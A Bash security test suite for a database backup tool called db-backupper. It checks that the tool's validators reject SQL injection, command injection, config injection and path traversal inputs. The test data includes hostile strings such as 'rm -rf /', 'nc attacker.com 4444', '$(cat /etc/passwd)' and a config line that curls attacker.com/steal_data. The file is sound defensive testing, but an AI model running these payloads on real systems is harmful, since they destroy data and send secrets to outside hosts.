#!/usr/bin/env bash
# Security test suite for db-backupper
# Tests all identified security vulnerabilities to ensure they are properly fixed

set -euo pipefail

# Source the library functions for testing
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$SCRIPT_DIR/../lib"

# shellcheck source=../lib/utils.sh
source "$LIB_DIR/utils.sh"
# shellcheck source=../lib/config.sh  
source "$LIB_DIR/config.sh"
# shellcheck source=../lib/database.sh
source "$LIB_DIR/database.sh"
# shellcheck source=../lib/backup.sh
source "$LIB_DIR/backup.sh"
# shellcheck source=../lib/restore.sh
source "$LIB_DIR/restore.sh"

# Test results tracking
TESTS_PASSED=0
TESTS_FAILED=0
TEST_LOG="/tmp/security-tests-$(date +%s).log"

# Test logging
test_info() {
    echo "[TEST] $1" | tee -a "$TEST_LOG"
}

test_pass() {
    echo "✅ PASS: $1" | tee -a "$TEST_LOG"
    TESTS_PASSED=$((TESTS_PASSED + 1))
}

test_fail() {
    echo "❌ FAIL: $1" | tee -a "$TEST_LOG"
    TESTS_FAILED=$((TESTS_FAILED + 1))
}

# Test 1: SQL Injection Prevention
test_sql_injection() {
    test_info "Testing SQL injection prevention..."
    
    # Test malicious database names
    local malicious_names=(
        "test; DROP TABLE users; --"
        "test'; DELETE FROM accounts; --"
        'test"; DROP SCHEMA public CASCADE; --'
        "test OR 1=1"
    )
    
    for db_name in "${malicious_names[@]}"; do
        if validate_db_identifier "$db_name"; then
            test_fail "SQL injection test: $db_name was accepted"
        else
            test_pass "SQL injection test: $db_name was rejected"
        fi
    done
    
    # Test valid database names
    local valid_names=(
        "test_db"
        "myapp-prod"
        "database123"
        "app_v2"
    )
    
    for db_name in "${valid_names[@]}"; do
        if validate_db_identifier "$db_name"; then
            test_pass "Valid DB name test: $db_name was accepted"
        else
            test_fail "Valid DB name test: $db_name was rejected"
        fi
    done
}

# Test 2: Command Injection Prevention
test_command_injection() {
    test_info "Testing command injection prevention..."
    
    # Test malicious container names
    local malicious_containers=(
        "container; rm -rf /"
        "app && curl malicious.com"
        "db|nc attacker.com 4444"
        'container`whoami`'
        "container\$(cat /etc/passwd)"
    )
    
    for container in "${malicious_containers[@]}"; do
        if validate_container_name "$container"; then
            test_fail "Command injection test: $container was accepted"
        else
            test_pass "Command injection test: $container was rejected"
        fi
    done
    
    # Test valid container names
    local valid_containers=(
        "postgres_db"
        "app-database"
        "mydb.container"
        "db123"
    )
    
    for container in "${valid_containers[@]}"; do
        if validate_container_name "$container"; then
            test_pass "Valid container test: $container was accepted"
        else
            test_fail "Valid container test: $container was rejected"
        fi
    done
}

# Test 3: Configuration Security
test_config_security() {
    test_info "Testing configuration security..."
    
    # Create malicious config file
    local malicious_config="/tmp/malicious_config.conf"
    cat > "$malicious_config" << 'EOF'
# Malicious config file
AWS_PROFILE="default"
S3_BUCKET_NAME="test-bucket"
POSTGRES_URI="postgresql://user:pass@localhost/test"
DOCKER_CONTAINER_NAME="postgres"
# Malicious code injection attempt
rm -rf /tmp/test_file; echo "HACKED"
MALICIOUS_VAR=$(curl http://attacker.com/steal_data)
EOF
    
    # Test that malicious config is rejected
    if (load_config_secure "$malicious_config" 2>/dev/null); then
        test_fail "Malicious config was executed"
    else
        test_pass "Malicious config was rejected"
    fi
    
    # Create valid config file  
    local valid_config="/tmp/valid_config.conf"
    cat > "$valid_config" << 'EOF'
# Valid config file
AWS_PROFILE="production"
S3_BUCKET_NAME="my-backup-bucket"
POSTGRES_URI="postgresql://user:password@db.example.com:5432/myapp"
DOCKER_CONTAINER_NAME="postgres_container"
S3_BACKUP_PATH="backups/"
EOF
    
    # Test that valid config is accepted
    if (load_config_secure "$valid_config" 2>/dev/null); then
        test_pass "Valid config was accepted"
    else
        test_fail "Valid config was rejected"
    fi
    
    # Cleanup
    rm -f "$malicious_config" "$valid_config"
}

# Test 4: Path Traversal Prevention
test_path_traversal() {
    test_info "Testing path traversal prevention..."
    
    # Test malicious S3 prefixes
    local malicious_prefixes=(
        "../../../etc/"
        "../../root/.ssh/"
        "/absolute/path/to/sensitive/"
        "..\\..\\windows\\system32\\"
        "backup/../../../etc/passwd"
        ".aws/credentials"
        "aws/config"
    )
    
    for prefix in "${malicious_prefixes[@]}"; do
        local result
        if result=$(sanitize_s3_prefix "$prefix" 2>/dev/null); then
            if [[ "$result" == *".."* ]] || [[ "$result" == "/"* ]]; then
                test_fail "Path traversal test: $prefix produced unsafe result: $result"
            else
                test_pass "Path traversal test: $prefix was sanitized safely"
            fi
        else
            test_pass "Path traversal test: $prefix was sanitized or rejected"
        fi
    done
    
    # Test valid prefixes
    local valid_prefixes=(
        "production/"
        "backups/2024/"
        "app-backups"
        "daily/full/"
    )
    
    for prefix in "${valid_prefixes[@]}"; do
        local result
        if result=$(sanitize_s3_prefix "$prefix" 2>/dev/null) && [[ -n "$result" ]]; then
            test_pass "Valid prefix test: $prefix was accepted as $result"
        else
            test_fail "Valid prefix test: $prefix was rejected"
        fi
    done
}

# Test 5: Archive Security
test_archive_security() {
    test_info "Testing archive extraction security..."
    
    # Create test directory
    local test_dir="/tmp/archive_test_$$"
    mkdir -p "$test_dir"
    
    # Create malicious archive (simulated - we can't actually create dangerous archives in testing)
    local malicious_archive="$test_dir/malicious.tar.gz"
    
    # Create a tar with path traversal attempt
    (
        cd "$test_dir"
        mkdir -p "safe_dir"
        echo "safe content" > "safe_dir/file.txt"
        echo "malicious content" > "malicious_file.txt"
        
        # Create tar with relative path that would escape
        tar -czf "$malicious_archive" "safe_dir/file.txt" || true
    )
    
    # Test extraction to temporary directory
    local extract_dir="$test_dir/extract"
    mkdir -p "$extract_dir"
    
    # The secure_tar_extract function should handle this safely
    if secure_tar_extract "$malicious_archive" "$extract_dir" >/dev/null 2>&1; then
        # Check that only safe files were extracted
        local extracted_files
        extracted_files=$(find "$extract_dir" -type f | wc -l)
        if [[ $extracted_files -le 1 ]]; then
            test_pass "Archive security: extraction was limited to safe files"
        else
            test_fail "Archive security: too many files extracted"
        fi
    else
        test_pass "Archive security: malicious archive was rejected"
    fi
    
    # Cleanup
    rm -rf "$test_dir"
}

# Test 6: Resource Limits
test_resource_limits() {
    test_info "Testing resource monitoring..."
    
    # Test disk space checking (with very large requirement)
    if check_disk_space 999999999999999999 "/tmp" 2>/dev/null; then
        test_fail "Resource test: unrealistic disk space requirement was accepted"
    else
        test_pass "Resource test: insufficient disk space was detected"
    fi
    
    # Test reasonable disk space requirement
    if check_disk_space 1024 "/tmp" 2>/dev/null; then
        test_pass "Resource test: reasonable disk space requirement was accepted"
    else
        test_fail "Resource test: reasonable disk space requirement was rejected"
    fi
    
    # Test memory monitoring
    local current_mem
    current_mem=$(get_memory_usage)
    if [[ $current_mem -gt 0 ]]; then
        test_pass "Resource test: memory usage monitoring works ($current_mem MB)"
    else
        test_fail "Resource test: memory usage monitoring failed"
    fi
}

create_stub_command() {
    local bin_dir="$1"
    local command_name="$2"

    cat > "${bin_dir}/${command_name}" << 'EOF'
#!/usr/bin/env bash
exit 0
EOF
    chmod +x "${bin_dir}/${command_name}"
}

# Test 7: Project config validation
test_project_config_support() {
    test_info "Testing project configuration support..."

    local temp_root
    temp_root=$(mktemp -d)
    local temp_home="${temp_root}/home"
    local previous_home="$HOME"

    mkdir -p "${temp_home}/.config/db-backupper/projects"

    cat > "${temp_home}/.config/db-backupper/projects/app-prod.conf" << 'EOF'
AWS_PROFILE="prod"
S3_BUCKET_NAME="bucket"
S3_BACKUP_PATH="postgres/app-prod/"
POSTGRES_URI="postgresql://user:password@localhost:5432/app_prod"
DOCKER_CONTAINER_NAME="postgres-app-prod"
EOF

    HOME="$temp_home"

    if validate_project_name "app-prod_01"; then
        test_pass "Project name validation accepts valid names"
    else
        test_fail "Project name validation rejected a valid name"
    fi

    if validate_project_name "app/prod" >/dev/null 2>&1; then
        test_fail "Project name validation accepted an invalid name"
    else
        test_pass "Project name validation rejects invalid names"
    fi

    if load_project_config "app-prod" >/dev/null 2>&1; then
        test_pass "Project config loading accepted a valid project config"
    else
        test_fail "Project config loading rejected a valid project config"
    fi

    if [[ "${AWS_PROFILE:-}" == "prod" && "${S3_BUCKET_NAME:-}" == "bucket" ]]; then
        test_pass "Project config loading populated runtime variables"
    else
        test_fail "Project config loading did not populate runtime variables"
    fi

    if (load_project_config "missing-project" >/dev/null 2>&1); then
        test_fail "Missing project config was accepted"
    else
        test_pass "Missing project config was rejected"
    fi

    HOME="$previous_home"
    rm -rf "$temp_root"
}

# Test 8: CLI project flag compatibility
test_cli_project_flag() {
    test_info "Testing CLI project flag compatibility..."

    local temp_root
    temp_root=$(mktemp -d)
    local temp_home="${temp_root}/home"
    local fake_bin="${temp_root}/bin"
    local cli_path="${SCRIPT_DIR}/../db-backupper"
    local legacy_output=""
    local project_output=""

    mkdir -p "${temp_home}/.config/db-backupper/projects" "${fake_bin}"

    cat > "${temp_home}/.config/db-backupper/backup.conf" << 'EOF'
AWS_PROFILE="legacy"
S3_BUCKET_NAME="legacy-bucket"
S3_BACKUP_PATH="legacy/"
POSTGRES_URI="postgresql://user:password@localhost:5432/legacydb"
DOCKER_CONTAINER_NAME="legacy-postgres"
EOF

    cat > "${temp_home}/.config/db-backupper/projects/app-prod.conf" << 'EOF'
AWS_PROFILE="project"
S3_BUCKET_NAME="project-bucket"
S3_BACKUP_PATH="project/"
POSTGRES_URI="postgresql://user:password@localhost:5432/projectdb"
DOCKER_CONTAINER_NAME="project-postgres"
EOF

    create_stub_command "$fake_bin" "aws"
    create_stub_command "$fake_bin" "docker"
    create_stub_command "$fake_bin" "tar"
    create_stub_command "$fake_bin" "find"
    create_stub_command "$fake_bin" "sed"
    create_stub_command "$fake_bin" "tr"

    if legacy_output=$(HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" crontab 2>/dev/null); then
        test_pass "CLI still works in legacy mode without --project"
    else
        test_fail "CLI failed in legacy mode without --project"
    fi

    if [[ "$legacy_output" == *"Active mode: legacy backup.conf"* ]] && [[ "$legacy_output" != *"--project"* ]]; then
        test_pass "Legacy crontab output stays in legacy mode"
    else
        test_fail "Legacy crontab output included unexpected project mode details"
    fi

    if project_output=$(HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" --project app-prod crontab 2>/dev/null); then
        test_pass "CLI accepts --project before the action"
    else
        test_fail "CLI rejected --project before the action"
    fi

    if HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" crontab --project app-prod >/dev/null 2>&1; then
        test_pass "CLI accepts --project after the action"
    else
        test_fail "CLI rejected --project after the action"
    fi

    if HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" --project missing-project crontab >/dev/null 2>&1; then
        test_fail "CLI accepted a missing project config"
    else
        test_pass "CLI rejects a missing project config"
    fi

    if [[ "$project_output" == *"Active project: app-prod"* ]] && [[ "$project_output" == *"--project \"app-prod\" backup"* ]]; then
        test_pass "Project crontab output includes the active project flag"
    else
        test_fail "Project crontab output is missing the active project flag"
    fi

    rm -rf "$temp_root"
}

# Test 9: Project listing works without active config
test_list_projects() {
    test_info "Testing project listing command..."

    local temp_root
    temp_root=$(mktemp -d)
    local temp_home="${temp_root}/home"
    local temp_workdir="${temp_root}/workdir"
    local cli_path="${SCRIPT_DIR}/../db-backupper"
    local output=""

    mkdir -p "${temp_home}/.config/db-backupper/projects"
    mkdir -p "${temp_workdir}/.db-backupper/projects"

    cat > "${temp_home}/.config/db-backupper/projects/home-app.conf" << 'EOF'
AWS_PROFILE="home"
S3_BUCKET_NAME="bucket"
POSTGRES_URI="postgresql://user:password@localhost:5432/home_app"
DOCKER_CONTAINER_NAME="home-postgres"
EOF

    cat > "${temp_home}/.config/db-backupper/projects/shared.conf" << 'EOF'
AWS_PROFILE="home"
S3_BUCKET_NAME="bucket"
POSTGRES_URI="postgresql://user:password@localhost:5432/home_shared"
DOCKER_CONTAINER_NAME="home-shared-postgres"
EOF

    cat > "${temp_workdir}/.db-backupper/projects/local-app.conf" << 'EOF'
AWS_PROFILE="local"
S3_BUCKET_NAME="bucket"
POSTGRES_URI="postgresql://user:password@localhost:5432/local_app"
DOCKER_CONTAINER_NAME="local-postgres"
EOF

    cat > "${temp_workdir}/.db-backupper/projects/shared.conf" << 'EOF'
AWS_PROFILE="local"
S3_BUCKET_NAME="bucket"
POSTGRES_URI="postgresql://user:password@localhost:5432/local_shared"
DOCKER_CONTAINER_NAME="local-shared-postgres"
EOF

    if output=$(cd "$temp_workdir" && HOME="$temp_home" "$cli_path" list-projects 2>/dev/null); then
        test_pass "list-projects runs without legacy config or command dependencies"
    else
        test_fail "list-projects failed without legacy config or command dependencies"
    fi

    if [[ "$output" == *"1. local-app -> ./.db-backupper/projects/local-app.conf"* ]] && [[ "$output" == *"2. shared -> ./.db-backupper/projects/shared.conf"* ]] && [[ "$output" == *"3. home-app -> ${temp_home}/.config/db-backupper/projects/home-app.conf"* ]]; then
        test_pass "list-projects reports discovered projects in precedence order"
    else
        test_fail "list-projects did not report expected projects and precedence"
    fi

    if [[ "$output" != *"${temp_home}/.config/db-backupper/projects/shared.conf"* ]]; then
        test_pass "list-projects deduplicates lower-precedence project names"
    else
        test_fail "list-projects showed duplicate project names from lower-precedence configs"
    fi

    if HOME="$temp_home" "$cli_path" --project app-prod list-projects >/dev/null 2>&1; then
        test_fail "list-projects accepted --project unexpectedly"
    else
        test_pass "list-projects rejects --project as invalid"
    fi

    rm -rf "$temp_root"
}

# Main test runner
main() {
    test_info "Starting security test suite for db-backupper"
    test_info "Log file: $TEST_LOG"
    
    # Run all security tests
    test_sql_injection
    test_command_injection
    test_config_security
    test_path_traversal
    test_archive_security
    test_resource_limits
    test_project_config_support
    test_cli_project_flag
    test_list_projects
    
    # Report results
    echo
    echo "=================================="
    echo "Security Test Results Summary"
    echo "=================================="
    echo "Tests passed: $TESTS_PASSED"
    echo "Tests failed: $TESTS_FAILED"
    echo "Total tests:  $((TESTS_PASSED + TESTS_FAILED))"
    echo "Log file:     $TEST_LOG"
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo "🎉 All security tests passed!"
        exit 0
    else
        echo "⚠️  Some security tests failed. Review the log for details."
        exit 1
    fi
}

# Run tests if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
